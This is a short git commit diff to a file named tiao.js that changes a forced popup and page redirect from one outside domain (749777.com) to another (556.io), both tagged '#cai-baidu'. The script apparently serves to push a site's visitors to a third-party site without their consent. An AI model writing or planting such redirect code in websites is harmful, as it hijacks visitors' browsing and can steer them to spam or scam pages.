1baf61bd108db544598fa301fb965559a9e96fa0
js999999999 <js-9@outlook.com>
2015-11-30 23:08:53 +0800

    Update tiao.js

--- cy1z/tiao.js
+++ cy1z/tiao.js
@@ -1,2 +1,2 @@
- window.open ("http://www.749777.com/#cai-baidu"); 
- window.location.href="http://www.749777.com/#cai-baidu"; 
+ window.open ("http://556.io/#cai-baidu"); 
+ window.location.href="http://556.io/#cai-baidu"; 
